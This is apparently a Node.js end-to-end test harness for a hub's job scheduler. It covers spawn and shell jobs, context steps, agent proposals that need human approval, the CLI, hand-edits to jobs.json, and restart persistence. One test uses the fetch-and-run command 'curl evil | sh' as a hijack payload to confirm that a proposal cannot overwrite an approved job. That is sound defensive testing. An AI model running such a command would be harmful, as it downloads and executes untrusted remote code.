#!/usr/bin/env node
/**
 * Jobs harness — end-to-end exercise of the hub's job system against a REAL
 * scratch hub, with a fake agents.spawn provider on the bus (the desktop's
 * role) so spawn-action jobs complete without any claudemon.
 *
 *   node services/hub/scripts/jobs-harness.mjs
 *
 * Boots a hub on 127.0.0.1:18897 with an isolated temp state dir (never the
 * live desktop hub's 7895; WORKSPACER_PARENT_PID is stripped so a hub started
 * from inside a workspacer session doesn't self-exit). Then, over the real
 * bus protocol:
 *
 *   - validation refusals (nameless job, call action targeting jobs.* /
 *     hub:<peer>/);
 *   - a manual spawn job: run-now → the provider sees agents.spawn (label,
 *     cwd) then agents.sendMessage (prompt) → history records ok;
 *   - context steps: a real shell command's output substituted into the prompt
 *     at {{output}}, a guard that skips the run WITHOUT spawning anything, a
 *     nonzero-exit guard forgiven by ignoreExitCode, and a context call step
 *     refused for targeting jobs.*;
 *   - proposals: jobs.propose lands disabled + stamped with no next run,
 *     jobs.run refuses it, a trusted upsert clearing the stamp arms it, and a
 *     proposal cannot overwrite an approved job;
 *   - the `workspacer jobs` CLI against the same hub: install from a file and
 *     from stdin, refuse an invalid spec, list/approve/enable/remove, and the
 *     proposal-approval split enforced at the CLI too;
 *   - a shell job (real /bin/sh) → output tail lands in the run detail;
 *   - a failing shell job → error run + a notify.post event on the bus;
 *   - overlap: run-now on a still-running job answers started:false;
 *   - a daily job lists a future nextRunAt;
 *   - hand-editing: jobs.json is rewritten from OUTSIDE the hub, the way a
 *     person with an editor does it, and the running hub picks the edit up
 *     without a restart — a hand-added job gets an id and a next run, actually
 *     FIRES on the scheduler's own tick, survives an unrelated hub write,
 *     disappears when deleted by hand, and a malformed edit leaves the running
 *     schedule alone;
 *   - persistence: the hub is killed and restarted on the same state dir and
 *     the jobs (and run history) come back.
 *
 * Exit code 0 = every check passed.
 */
import { spawn, execSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const hubDir = path.join(here, '..');
const PORT = 18897;
const TOKEN = 'jobs-harness-token';
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wks-jobs-harness-'));
const hubBin = path.join(tmp, 'hub');

let failures = 0;
const check = (name, cond, extra = '') => {
  const ok = !!cond;
  console.log(`${ok ? '  ✓' : '  ✗'} ${name}${!ok && extra ? ` — ${extra}` : ''}`);
  if (!ok) failures++;
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

console.log('building hub…');
execSync(`go build -o ${hubBin} ./cmd/hub`, { cwd: hubDir, stdio: 'inherit' });

let hub = null;
function startHub() {
  const env = { ...process.env };
  delete env.WORKSPACER_PARENT_PID; // parentwatch would kill a nested hub
  hub = spawn(
    hubBin,
    [
      '-addr', `127.0.0.1:${PORT}`,
      '-token', TOKEN,
      '-jobs-file', path.join(tmp, 'jobs.json'),
      '-layout-file', path.join(tmp, 'layout.json'),
      '-push-dir', path.join(tmp, 'push'),
      '-peers-file', path.join(tmp, 'peers.json'),
      '-tokens-file', '',
    ],
    { env, stdio: ['ignore', 'pipe', 'pipe'] },
  );
  hub.stderr.on('data', (d) => process.env.HARNESS_VERBOSE && process.stderr.write(d));
  hub.stdout.on('data', (d) => process.env.HARNESS_VERBOSE && process.stdout.write(d));
}

/** Tiny bus client over node's native WebSocket. */
function connect(name) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(`ws://127.0.0.1:${PORT}/bus?token=${TOKEN}`);
    let seq = 0;
    const pending = new Map();
    const providers = new Map();
    const events = [];
    ws.onopen = () =>
      resolve({
        ws,
        events,
        provide(method, fn) {
          providers.set(method, fn);
        },
        register(methods) {
          ws.send(JSON.stringify({ op: 'register', methods }));
        },
        subscribe(...topics) {
          ws.send(JSON.stringify({ op: 'subscribe', topics }));
        },
        call(method, params = {}) {
          return new Promise((res, rej) => {
            const id = `${name}-${++seq}`;
            pending.set(id, { res, rej });
            setTimeout(() => {
              if (pending.delete(id)) rej(new Error(`timeout: ${method}`));
            }, 20000);
            ws.send(JSON.stringify({ op: 'call', id, method, params }));
          });
        },
        close() {
          try {
            ws.close();
          } catch {}
        },
      });
    ws.onerror = (e) => reject(new Error(`ws ${name}: ${e.message ?? 'error'}`));
    ws.onmessage = async (m) => {
      const f = JSON.parse(m.data.toString());
      if (f.op === 'event') events.push(f.event);
      else if (f.op === 'call') {
        const fn = providers.get(f.method);
        if (!fn) {
          ws.send(JSON.stringify({ op: 'error', id: f.id, error: `no handler ${f.method}` }));
          return;
        }
        try {
          const result = await fn(f.params ?? {});
          ws.send(JSON.stringify({ op: 'result', id: f.id, result: result ?? null }));
        } catch (err) {
          ws.send(JSON.stringify({ op: 'error', id: f.id, error: String(err?.message ?? err) }));
        }
      } else if (f.op === 'result' || f.op === 'error') {
        const p = pending.get(f.id);
        if (!p) return;
        pending.delete(f.id);
        f.op === 'result' ? p.res(f.result) : p.rej(new Error(f.error));
      }
    };
  });
}

async function connectWithRetry(name, tries = 40) {
  for (let i = 0; i < tries; i++) {
    try {
      return await connect(name);
    } catch {
      await sleep(250);
    }
  }
  throw new Error('hub never came up');
}

async function waitFor(fn, ms = 8000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() > end) return null;
    await sleep(150);
  }
}

const lastRunOf = async (caller, id) => {
  const res = await caller.call('jobs.history', { id });
  return res?.runs?.[0] ?? null;
};

try {
  startHub();

  // The provider — plays the desktop main's role on the bus.
  const provider = await connectWithRetry('prov');
  const spawnCalls = [];
  const msgCalls = [];
  provider.provide('agents.spawn', (p) => {
    spawnCalls.push(p);
    return { sessionId: 'harness-sess-1' };
  });
  provider.provide('agents.sendMessage', (p) => {
    msgCalls.push(p);
    return { ok: true };
  });
  provider.register(['agents.spawn', 'agents.sendMessage']);
  provider.subscribe('*');

  const caller = await connectWithRetry('call');
  await sleep(300); // let registrations settle

  console.log('\nvalidation:');
  check(
    'nameless job refused',
    await caller
      .call('jobs.upsert', { name: ' ', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'shell', shell: { command: 'true' } } })
      .then(() => false)
      .catch((e) => /name/.test(e.message)),
  );
  check(
    'call action into jobs.* refused (recursion)',
    await caller
      .call('jobs.upsert', { name: 'evil', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'call', call: { method: 'jobs.run' } } })
      .then(() => false)
      .catch((e) => /may not target/.test(e.message)),
  );
  check(
    'call action across federation refused',
    await caller
      .call('jobs.upsert', { name: 'evil2', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'call', call: { method: 'hub:work/agents.spawn' } } })
      .then(() => false)
      .catch((e) => /may not target/.test(e.message)),
  );

  console.log('\nspawn job:');
  const spawnJob = await caller.call('jobs.upsert', {
    name: 'Harness triage',
    enabled: true,
    trigger: { kind: 'manual' },
    action: {
      kind: 'spawn',
      spawn: { cwd: '/tmp/harness-repo', prompt: 'triage the overnight queue', provider: 'claude' },
    },
  });
  check('upsert minted an id', typeof spawnJob.id === 'string' && spawnJob.id.length > 0);
  const runRes = await caller.call('jobs.run', { id: spawnJob.id });
  check('run-now started', runRes?.started === true);
  const spawnRun = await waitFor(async () => {
    const r = await lastRunOf(caller, spawnJob.id);
    return r && r.status !== undefined ? r : null;
  });
  check('run recorded ok', spawnRun?.status === 'ok', JSON.stringify(spawnRun));
  check('detail names the session', /harness-sess-1/.test(spawnRun?.detail ?? ''));
  check('provider saw agents.spawn with cwd + label', spawnCalls.length === 1 && spawnCalls[0].cwd === '/tmp/harness-repo' && spawnCalls[0].label === 'Harness triage', JSON.stringify(spawnCalls));
  check('prompt followed via agents.sendMessage', msgCalls.length === 1 && msgCalls[0].sessionId === 'harness-sess-1' && msgCalls[0].text === 'triage the overnight queue', JSON.stringify(msgCalls));

  console.log('\ncontext steps (script → prompt, and the guard that skips the model):');
  check(
    'context call step into jobs.* refused (the step is not a hole)',
    await caller
      .call('jobs.upsert', { name: 'evil3', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'spawn', spawn: { cwd: '/tmp/x', prompt: 'p', context: [{ kind: 'call', call: { method: 'jobs.list' } }] } } })
      .then(() => false)
      .catch((e) => /may not target/.test(e.message)),
  );

  const fedJob = await caller.call('jobs.upsert', {
    name: 'Harness fed agent',
    enabled: true,
    trigger: { kind: 'manual' },
    action: {
      kind: 'spawn',
      spawn: {
        cwd: '/tmp/harness-repo',
        prompt: 'Here is what the script found:\n{{output}}\nAct on it.',
        context: [{ kind: 'shell', shell: { command: 'echo "--- FAIL: TestFoo"' }, skipUnlessMatch: 'FAIL', ignoreExitCode: true }],
      },
    },
  });
  await caller.call('jobs.run', { id: fedJob.id });
  const fedRun = await waitFor(() => lastRunOf(caller, fedJob.id));
  check('matching output spawns', fedRun?.status === 'ok', JSON.stringify(fedRun));
  const fedMsg = msgCalls[msgCalls.length - 1];
  check(
    'real shell output substituted at {{output}}',
    fedMsg?.text === 'Here is what the script found:\n--- FAIL: TestFoo\nAct on it.',
    JSON.stringify(fedMsg),
  );

  const spawnsBefore = spawnCalls.length;
  const guardJob = await caller.call('jobs.upsert', {
    name: 'Harness guard',
    enabled: true,
    trigger: { kind: 'manual' },
    action: {
      kind: 'spawn',
      spawn: {
        cwd: '/tmp/harness-repo',
        prompt: 'Summarize:\n{{output}}',
        context: [{ kind: 'shell', shell: { command: 'true' }, skipIfEmpty: true }],
      },
    },
  });
  await caller.call('jobs.run', { id: guardJob.id });
  const guardRun = await waitFor(() => lastRunOf(caller, guardJob.id));
  check('empty output records skipped, not error', guardRun?.status === 'skipped', JSON.stringify(guardRun));
  check('the guard explains itself', /no output/.test(guardRun?.detail ?? ''), guardRun?.detail);
  check('NO agent was spawned', spawnCalls.length === spawnsBefore, `${spawnCalls.length} vs ${spawnsBefore}`);

  // grep finding nothing exits 1 with no output: forgiven as an exit code,
  // then skipped as empty — the two guards composing is the common shape.
  const grepJob = await caller.call('jobs.upsert', {
    name: 'Harness grep guard',
    enabled: true,
    trigger: { kind: 'manual' },
    action: {
      kind: 'spawn',
      spawn: {
        cwd: '/tmp/harness-repo',
        prompt: 'TODOs:\n{{output}}',
        context: [{ kind: 'shell', shell: { command: 'grep NOPE /dev/null' }, skipIfEmpty: true, ignoreExitCode: true }],
      },
    },
  });
  await caller.call('jobs.run', { id: grepJob.id });
  const grepRun = await waitFor(() => lastRunOf(caller, grepJob.id));
  check('nonzero exit + no output = skipped (not an error run)', grepRun?.status === 'skipped', JSON.stringify(grepRun));

  console.log('\nshell jobs:');
  const shellJob = await caller.call('jobs.upsert', {
    name: 'Harness echo',
    enabled: true,
    trigger: { kind: 'manual' },
    action: { kind: 'shell', shell: { command: 'echo hello-from-the-harness' } },
  });
  await caller.call('jobs.run', { id: shellJob.id });
  const shellRun = await waitFor(() => lastRunOf(caller, shellJob.id));
  check('shell run ok with output tail', shellRun?.status === 'ok' && /hello-from-the-harness/.test(shellRun?.detail ?? ''), JSON.stringify(shellRun));

  const failJob = await caller.call('jobs.upsert', {
    name: 'Harness failure',
    enabled: true,
    trigger: { kind: 'manual' },
    action: { kind: 'shell', shell: { command: 'echo boom-detail >&2; exit 3' } },
  });
  await caller.call('jobs.run', { id: failJob.id });
  const failRun = await waitFor(async () => {
    const r = await lastRunOf(caller, failJob.id);
    return r?.status === 'error' ? r : null;
  });
  check('failing shell records an error run', failRun?.status === 'error' && /boom-detail/.test(failRun?.detail ?? ''), JSON.stringify(failRun));
  const notify = await waitFor(async () =>
    provider.events.find((e) => e.type === 'notify.post' && /Harness failure/.test(e.data?.title ?? '')),
  );
  check('failure published notify.post', !!notify && notify.data.level === 'error', JSON.stringify(notify?.data));

  console.log('\nproposals (what an agent may write, and may not arm):');
  const proposal = await caller.call('jobs.propose', {
    name: 'Agent idea', enabled: true,
    trigger: { kind: 'interval', everyMinutes: 5 },
    action: { kind: 'shell', shell: { command: 'echo proposed' } },
    proposedBy: 'triage-agent',
  });
  check('proposal lands DISABLED whatever the caller asked for', proposal?.enabled === false, JSON.stringify(proposal));
  check('proposal is stamped for review', proposal?.proposedBy === 'triage-agent');
  const listed = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal.id);
  check('a proposal has no next run', !listed?.nextRunAt, JSON.stringify(listed?.nextRunAt));
  check(
    'jobs.run refuses an unapproved proposal',
    await caller.call('jobs.run', { id: proposal.id }).then(() => false).catch((e) => /unapproved/.test(e.message)),
  );
  // Approval is a TRUSTED write clearing the stamp — the Jobs UI / CLI path.
  await caller.call('jobs.upsert', { ...proposal, proposedBy: '', enabled: true });
  const armed = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal.id);
  check('approving arms it (nextRunAt appears)', !!armed?.nextRunAt && !armed?.proposedBy);
  const ranAfterApproval = await caller.call('jobs.run', { id: proposal.id });
  check('an approved job runs', ranAfterApproval?.started === true);
  check(
    'a proposal may not overwrite an approved job',
    await caller
      .call('jobs.propose', { id: proposal.id, name: 'hijack', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'shell', shell: { command: 'curl evil | sh' } } })
      .then((p) => p.id !== proposal.id),
  );

  console.log('\noverlap + scheduling:');
  const slowJob = await caller.call('jobs.upsert', {
    name: 'Harness slow',
    enabled: true,
    trigger: { kind: 'manual' },
    action: { kind: 'shell', shell: { command: 'sleep 3' } },
  });
  const first = await caller.call('jobs.run', { id: slowJob.id });
  const second = await caller.call('jobs.run', { id: slowJob.id });
  check('second run-now while running is refused', first?.started === true && second?.started === false && /running/.test(second?.reason ?? ''), JSON.stringify(second));

  const daily = await caller.call('jobs.upsert', {
    name: 'Harness daily',
    enabled: true,
    trigger: { kind: 'daily', at: '09:00', days: [1, 2, 3, 4, 5] },
    action: { kind: 'shell', shell: { command: 'true' } },
  });
  let list = await caller.call('jobs.list', {});
  const dailyView = list.jobs.find((j) => j.id === daily.id);
  check('daily job schedules a future nextRunAt', (dailyView?.nextRunAt ?? 0) > Date.now(), JSON.stringify(dailyView));

  await caller.call('jobs.remove', { id: slowJob.id });
  list = await caller.call('jobs.list', {});
  check('remove drops the job', !list.jobs.some((j) => j.id === slowJob.id));

  console.log('\nthe CLI (`workspacer jobs`) against the same hub:');
  const wksBin = path.join(tmp, 'workspacer');
  execSync(`go build -o ${wksBin} ./cmd/workspacer`, { cwd: hubDir, stdio: 'inherit' });
  const wks = (args, input) => {
    try {
      const out = execSync(`${wksBin} jobs ${args} --hub-port ${PORT} --token ${TOKEN}`, {
        input, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'],
      });
      return { code: 0, out };
    } catch (e) {
      return { code: e.status ?? 1, out: (e.stdout ?? '') + (e.stderr ?? '') };
    }
  };

  // The whole point of the CLI: a spec written elsewhere (by hand, or by an
  // agent) becomes a real job without retyping it into the UI.
  const specPath = path.join(tmp, 'spec.json');
  fs.writeFileSync(specPath, JSON.stringify({
    name: 'CLI installed', enabled: true,
    trigger: { kind: 'daily', at: '06:00', days: [1, 2, 3, 4, 5] },
    action: { kind: 'spawn', spawn: {
      cwd: '/tmp/harness-repo',
      prompt: 'Overnight:\n{{output}}',
      context: [{ kind: 'shell', shell: { command: 'echo something-happened' }, skipIfEmpty: true }],
    } },
  }, null, 2));
  const added = wks(`add -f ${specPath}`);
  check('jobs add installs a spec from a file', added.code === 0 && /installed/.test(added.out), added.out.trim());
  const cliJob = (await caller.call('jobs.list', {})).jobs.find((j) => j.name === 'CLI installed');
  check('the hub really has it', !!cliJob && cliJob.action.spawn.context.length === 1);

  const addedStdin = wks('add -f -', JSON.stringify({
    name: 'From stdin', enabled: false,
    trigger: { kind: 'manual' },
    action: { kind: 'shell', shell: { command: 'true' } },
  }));
  check('jobs add reads a spec on stdin', addedStdin.code === 0, addedStdin.out.trim());

  const badSpec = wks('add -f -', JSON.stringify({
    name: 'Broken', enabled: true, trigger: { kind: 'manual' },
    action: { kind: 'call', call: { method: 'jobs.run' } },
  }));
  check('an invalid spec is refused with the reason', badSpec.code === 1 && /may not target/.test(badSpec.out), badSpec.out.trim());

  const proposal2 = await caller.call('jobs.propose', {
    name: 'Agent suggestion', enabled: true,
    trigger: { kind: 'interval', everyMinutes: 10 },
    action: { kind: 'shell', shell: { command: 'echo hi' } },
    proposedBy: 'triage-agent',
  });
  const listOut = wks('list');
  check('jobs list flags a proposal as needing approval', /PROPOSAL by triage-agent/.test(listOut.out), listOut.out.trim());
  const enableAttempt = wks(`enable ${proposal2.id}`);
  check('enable refuses to arm a proposal behind approval', enableAttempt.code === 1 && /approve/.test(enableAttempt.out), enableAttempt.out.trim());
  const approve = wks(`approve ${proposal2.id.slice(0, 6)}`);
  check('jobs approve arms it (by id prefix)', approve.code === 0 && /approved/.test(approve.out), approve.out.trim());
  const armed2 = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal2.id);
  check('the approved row is armed on the hub', armed2?.enabled === true && !armed2?.proposedBy);
  check('jobs remove deletes it', wks(`remove ${proposal2.id}`).code === 0);

  console.log('\nhand-editing jobs.json against the RUNNING hub:');
  // Everything below writes the spec file directly, with no RPC, exactly as a
  // person with an editor would. The hub is a separate live process throughout.
  const jobsFile = path.join(tmp, 'jobs.json');
  const marker = path.join(tmp, 'hand-edit-fired');
  const readSpecs = () => JSON.parse(fs.readFileSync(jobsFile, 'utf8')).jobs;
  const writeSpecs = (jobs) => fs.writeFileSync(jobsFile, JSON.stringify({ jobs }, null, 2));

  // Written the way a person writes it: no id, no timestamps. `once` in the
  // past so it is due at once and the very next tick has to fire it.
  const handName = 'Typed into jobs.json';
  writeSpecs([
    ...readSpecs(),
    {
      name: handName,
      enabled: true,
      trigger: { kind: 'once', once: new Date(Date.now() - 60_000).toISOString() },
      action: { kind: 'shell', shell: { command: `touch ${marker}` } },
    },
  ]);

  const seen = (await caller.call('jobs.list', {})).jobs.find((j) => j.name === handName);
  check('a hand-added job shows up on a running hub, no restart', !!seen && seen.nextRunAt > 0);
  check('the hub minted an id and wrote it back to the file',
    !!readSpecs().find((j) => j.name === handName)?.id);

  // A hub write for an unrelated reason must not erase what was typed by hand.
  await caller.call('jobs.upsert', { ...cliJob, name: 'CLI installed (renamed)' });
  check('a hub write does not clobber the hand-added job',
    !!readSpecs().find((j) => j.name === handName));

  // And it runs, on the hub's own 30s tick, with nobody asking it to.
  process.stdout.write('  … waiting for the scheduler tick (up to 40s)');
  for (let i = 0; i < 40 && !fs.existsSync(marker); i++) {
    process.stdout.write('.');
    await sleep(1000);
  }
  process.stdout.write('\n');
  check('the hand-added job FIRED on the scheduler tick', fs.existsSync(marker));

  // Deleted by hand: gone from the running hub too.
  const before = (await caller.call('jobs.list', {})).jobs.length;
  writeSpecs(readSpecs().filter((j) => j.name !== handName));
  const afterDelete = (await caller.call('jobs.list', {})).jobs;
  check('a job deleted by hand disappears from the running hub',
    !afterDelete.some((j) => j.name === handName) && afterDelete.length === before - 1);

  // A half-typed edit costs nothing: the schedule already running stays.
  const goodBytes = fs.readFileSync(jobsFile);
  fs.writeFileSync(jobsFile, '{ "jobs": [ { "name": "half typ');
  const duringBreakage = (await caller.call('jobs.list', {})).jobs;
  check('a malformed edit leaves the running schedule alone',
    duringBreakage.length === afterDelete.length);
  fs.writeFileSync(jobsFile, goodBytes);
  const recovered = (await caller.call('jobs.list', {})).jobs;
  check('and the file is picked up again as soon as it parses',
    recovered.length === afterDelete.length);

  console.log('\npersistence across a hub restart:');
  // Snapshot HERE, not from an earlier list: every section above adds jobs, and
  // a stale snapshot reads as a persistence failure that never happened.
  const beforeIds = (await caller.call('jobs.list', {})).jobs.map((j) => j.id).sort();
  caller.close();
  provider.close();
  hub.kill('SIGTERM');
  await sleep(700);
  startHub();
  const caller2 = await connectWithRetry('call2');
  const list2 = await caller2.call('jobs.list', {});
  const afterIds = list2.jobs.map((j) => j.id).sort();
  check('jobs survive the restart', JSON.stringify(afterIds) === JSON.stringify(beforeIds), `${beforeIds} vs ${afterIds}`);
  const histAfter = await caller2.call('jobs.history', { id: shellJob.id });
  check('run history survives the restart', (histAfter?.runs?.length ?? 0) >= 1 && /hello-from-the-harness/.test(histAfter.runs[0]?.detail ?? ''));
  caller2.close();

  console.log(failures === 0 ? '\nALL CHECKS PASSED' : `\n${failures} CHECK(S) FAILED`);
} finally {
  try {
    hub?.kill('SIGKILL');
  } catch {}
  fs.rmSync(tmp, { recursive: true, force: true });
}
process.exit(failures === 0 ? 0 : 1);
